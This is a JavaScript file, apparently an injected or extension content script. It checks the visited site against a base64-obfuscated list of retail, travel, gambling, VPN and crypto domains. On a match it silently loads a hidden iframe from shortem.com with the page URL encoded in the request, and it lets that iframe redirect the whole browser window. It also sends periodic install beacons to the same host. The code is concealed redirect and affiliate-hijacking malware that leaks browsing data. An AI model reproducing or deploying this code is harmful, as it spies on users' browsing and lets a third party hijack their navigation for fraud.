function countStr(string, subString, allowOverlapping) {
    string += ""; subString += "";
    if (subString.length <= 0) return (string.length + 1);
    var n = 0, pos = 0, step = allowOverlapping ? 1 : subString.length;
    while (true) {
        pos = string.indexOf(subString, pos);
        if (pos >= 0) {
            ++n;
            pos += step;
        } else break;
    }
    return n;
}

function trouverDom() {
	var d = document.location.hostname;
    var p = d.split('.');
	if("com" == p[p.length-1])
		return p[p.length-2] + '.' + p[p.length-1];
	else if(p.length > 2) {
		var a = [ "com.au","com.br","co.uk","com.ph","com.my","co.th","co.id","com.tw","com.hk","co.bd", "co.in","co.kr","com.mm","com.sa","com.eg","com.au" ];
		for (var i = 0; i < a.length; i++) {
			if(a[i] == p[p.length-2] + '.' + p[p.length-1])
				return p[p.length-3] + '.' + p[p.length-2] + '.' + p[p.length-1];
		}
	} 
	return p[p.length-2] + '.' + p[p.length-1];
}

function theCheck(host) {
	var a = { 'Ym9va2luZy5jb20=' : 1,'YWdvZGEuY29t' : 1,'dHJlem9yLmlv' : 1,'Y3liZXJnaG9zdHZwbi5jb20=' : 1,'aWhlcmIuY29t' : 1,'cmVkbWFydC5jb20=' : 1,'cGVyZnVtZS5jb20=' : 1,'bmlrZS5jb20=' : 1,'YWxpZXhwcmVzcy5jb20=' : 1,'Y2VudGF1cm8uY29tLmJy' : 1,'cmljYXJkb2VsZXRyby5jb20uYnI=' : 1,'dGlueWRlYWwuY29t' : 1,'aG90ZWxzLmNvbQ==' : 1,'bGl2ZWphc21pbi5jb20=' : 1,'Y2hhdHVyYmF0ZS5jb20=' : 1,'Yndpbi5jb20=' : 1,'Yndpbi5lcw==' : 1,'Yndpbi5iZQ==' : 1,'YmV0c3Nvbi5jb20=' : 1,'aG90ZWlzLmNvbQ==' : 1,'ZGVzcGVnYXIuY29t' : 1,'d2hhdGJyb3dzZXIub3Jn' : 1,'d2hhdGlzbXlicm93c2VyLmNvbQ==' : 1,'YXNvcy5jb20=' : 1,'ZHguY29t' : 1,'Z2VhcmJlc3QuY29t' : 1,'bGlnaHRpbnRoZWJveC5jb20=' : 1,'bWluaWludGhlYm94LmNvbQ==' : 1,'YmFuZ2dvb2QuY29t' : 1,'cm9zZWdhbC5jb20=' : 1,'dGFyZ2V0LmNvbQ==' : 1,'bXludHJhLmNvbQ==' : 1,'amFib25nLmNvbQ==' : 1,'cG9rZXJzdGFycy5jb20=' : 1,'ZnVsbHRpbHQuY29t' : 1,'cGlubmFjbGUuY29t' : 1,'ZXRvcm8uY29t' : 1,'bGVkZ2VyLmNvbQ==' : 1,'bG9jYWxiaXRjb2lucy5jb20=' : 1,'Y2hhbmdlbGx5LmNvbQ==' : 1,'YmluYW5jZS5jb20=' : 1,'a3Vjb2luLmNvbQ==' : 1,'cGx1czUwMC5jb20=' : 1,'Y2V4Lmlv' : 1,'dmlyYm94LmNvbQ==' : 1,'Yml0cGFuZGEuY29t' : 1,'ZXhwcmVzc3Zwbi5jb20=' : 1,'aGlkZXN0ZXIuY29t' : 1,'YWlydnBuLm9yZw==' : 1,'d2luZHNjcmliZS5jb20=' : 1,'Z29sZGVuZnJvZy5jb20=' : 1,'cHVyZXZwbi5jb20=' : 1,'cHJvdG9udnBuLmNvbQ==' : 1,'aXB2YW5pc2guY29t' : 1,'Ymx1ZWhvc3QuY29t' : 1,'ZHJlYW1ob3N0LmNvbQ==' : 1,'ZWxlZ2FudHRoZW1lcy5jb20=' : 1,'YmFuYWhvc3RpbmcuY29t' : 1,'dGVtcGxhdGVtb25zdGVyLmNvbQ==' : 1,'a29obHMuY29t' : 1,'NnBtLmNvbQ==' : 1,'YmFja2NvdW50cnkuY29t' : 1,'bG9mdC5jb20=' : 1,'c3VybGF0YWJsZS5jb20=' : 1,'c25hcGRlYWwuY29t' : 1,'emFsb3JhLnNn' : 1,'emFsb3JhLmNvLmlk' : 1,'emFsb3JhLmNvbS5waA==' : 1,'emFsb3JhLmNvbS5teQ==' : 1,'aG9zdGdhdG9yLmNvbQ==' : 1,'dGlrZXQuY29t' : 1,'Ym9ybnByZXR0eXN0b3JlLmNvbQ==' : 1,'ZHJlc3NsaWx5LmNvbQ==' : 1,'Z2Vla2J1eWluZy5jb20=' : 1,'emFwYWxzLmNvbQ==' : 1,'Z2FtaXNzLmNvbQ==' : 1,'b3Bza2lucy5jb20=' : 1,'c3RhZGl1bWdvb2RzLmNvbQ==' : 1,'dG9tdG9wLmNvbQ==' : 1,'c3VibWFyaW5vLmNvbS5icg==' : 1,'d2FsbWFydC5jb20uYnI=' : 1,'ZXh0cmEuY29tLmJy' : 1,'bWVnYW1hbXV0ZS5jb20uYnI=' : 1,'cG9udG9mcmlvLmNvbS5icg==' : 1,'YW1lcmljYW5hcy5jb20uYnI=' : 1,'dHJhdmVzc2EuY29tLmJy' : 1,'cmloYXBweS5jb20uYnI=' : 1,'Y2x1YmVkb3JpY2FyZG8uY29tLmJy' : 1,'bGl2cmFyaWFjdWx0dXJhLmNvbS5icg==' : 1,'ZnV0ZmFuYXRpY3MuY29tLmJy' : 1,'c3VwZXJtdWZmYXRvLmNvbS5icg==' : 1,'Y2xhc3NpY3Rlbm5pcy5jb20uYnI=' : 1,'c2llbm8uY29tLmJy' : 1,'bWFzaC5jb20uYnI=' : 1,'Y2x1YmVkb21hbHRlLmNvbS5icg==' : 1,'bW9kYWl0LmNvbS5icg==' : 1,'aGF2YW4uY29tLmJy' : 1,'cGJraWRzLmNvbS5icg==' : 1,'YW1hem9uLmNvbS5icg==' : 1,'bXVsdGlhci5jb20uYnI=' : 1,'am9pYXNsdWxlYW4uY29tLmJy' : 1,'bG9qYW11bHRpbGFzZXIuY29tLmJy' : 1,'cG5ldXN0b3JlLmNvbS5icg==' : 1,'bW9uYW1hLmNvbS5icg==' : 1,'dHZ6LmNvbS5icg==' : 1,'Y2hpY29yZWkuY29t' : 1,'c2hvcHRpbWUuY29tLmJy' : 1,'Z2lyYWZhLmNvbS5icg==' : 1,'dm9lZ29sLmNvbS5icg==' : 1,'Y3ZjLmNvbS5icg==' : 1,'bW9ibHkuY29tLmJy' : 1,'bGl2cmFyaWEuZm9saGEuY29tLmJy' : 1,'YW5uYXBlZ292YS5jb20uYnI=' : 1,'ZXhwZWRpYS5pdA==' : 1,'ZWRyZWFtcy5pdA==' : 1,'c2t5c2Nhbm5lci5pdA==' : 1,'c2l4dC5lcw==' : 1,'c2t5c2Nhbm5lci5lcw==' : 1,'dHJpcGFkdmlzb3IuaXQ=' : 1,'b3N0aW4uY29t' : 1,'bWVkaWFtYXJrdC5ydQ==' : 1,'cGxlZXIucnU=' : 1,'b2xkaS5ydQ==' : 1,'c3Z5YXpub3kucnU=' : 1,'c2hvcGNsdWVzLmNvbQ==' : 1,'dGF0YWNsaXEuY29t' : 1,'Ymlncm9jay5pbg==' : 1,'bWFrZW15dHJpcC5jb20=' : 1,'YmlnYmFza2V0LmNvbQ==' : 1,'YW1hem9uLmlu' : 1,'ZXhwZWRpYS5mcg==' : 1,'ZmxpeGJ1cy5mcg==' : 1,'YmVsYW1icmEuZnI=' : 1,'b3VpZ28uY29t' : 1,'cGVnaXBlZ2kuY29t' : 1,'bGF6YWRhLmNvbS5waA==' : 1,'bGF6YWRhLmNvbS5teQ==' : 1,'bGF6YWRhLmNvLmlk' : 1,'bGF6YWRhLnNn' : 1,'ZXhwZWRpYS5jb20uaGs=' : 1,'ZXhwZWRpYS5jby5pbg==' : 1,'ZXhwZWRpYS5jby5rcg==' : 1,'ZXhwZWRpYS5jb20udHc=' : 1,'ZXhwZWRpYS5jb20ucGg=' : 1,'ZXhwZWRpYS5jby50aA==' : 1,'ZXhwZWRpYS5jby5pZA==' : 1,'ZXhwZWRpYS5jb20ubXk=' : 1,'ODg4LmNvbQ==' : 1,'ODg4Lml0' : 1,'ODg4LnJv' : 1,'ODg4Y2FzaW5vLmNvbQ==' : 1,'ODg4Y2FzaW5vLmVz' : 1,'ODg4Y2FzaW5vLml0' : 1,'ODg4Y2FzaW5vLmRr' : 1,'ODg4Y2FzaW5vLnJv' : 1,'ODg4cG9rZXIuY29t' : 1,'ODg4cG9rZXIuZXM=' : 1,'ODg4cG9rZXIucm8=' : 1,'ODg4cG9rZXIuZGs=' : 1,'ODg4c3BvcnQuY29t' : 1,'ODg4c3BvcnQuZXM=' : 1,'ODg4c3BvcnQuaXQ=' : 1,'ODg4c3BvcnQuZGs=' : 1,'ODg4c3BvcnQucm8=' : 1};
	if(a[host]) return true; else return false;
}

function gG () {     
    var raw = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);
    return raw ? parseInt(raw[2], 10) : '';
}


function appendR() {
	if(window.location.href)
		var s = '?re=' + btoa(encodeURI(window.location.href)) + '&t=j&w=s&c=' +gG() +'&co=R0I=&i=cGl3aWs=';
	else 
		var s = '?t=j&w=s&c='+gG()+'&co=R0I=&i=cGl3aWs=';
	if(gG() >= 68)
		s = s + '&pm=1';
	return s;
}

function theCall(version,hash) {
	var r = new XMLHttpRequest(); 
	r.open("GET", '//'+'shortem.com'+'/r/'+version+'/'+hash+'/', true);
	r.onreadystatechange = function () { if (r.readyState != 4 || r.status != 200) return; };
	r.send("");
}

function theInsCheck() {
	if(typeof(Storage) !== "undefined") {
		// Code for localStorage
		if(!localStorage.getItem("_ins")) {
			theCall('v1','ins');
			localStorage.setItem("_ins", 1);
			localStorage.setItem("_ins_t", new Date().getTime());
		} else {
			// Check expiration!
		}
	} else {
		// Sorry! No Web Storage support...
	}
}

if(self == top){
	var to = Date.now() / 1000 | 0;
	if(!(to%4))
		theInsCheck();
	var d = trouverDom();
	if(theCheck(btoa(d))) {
		var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
		var eventer = window[eventMethod];
		var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";

		// Listen to message from child window
		eventer(messageEvent,function(e) {
			//console.log('parent received message!:  ',e.data);
			var data = String(e.data);
			if(data.startsWith("~~"))
				top.window.location = (atob(data.substring(2)));
		},false);
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = '//shortem.com/r/v1/aHe94/' + appendR();
		document.body.appendChild(iframe);
	}
}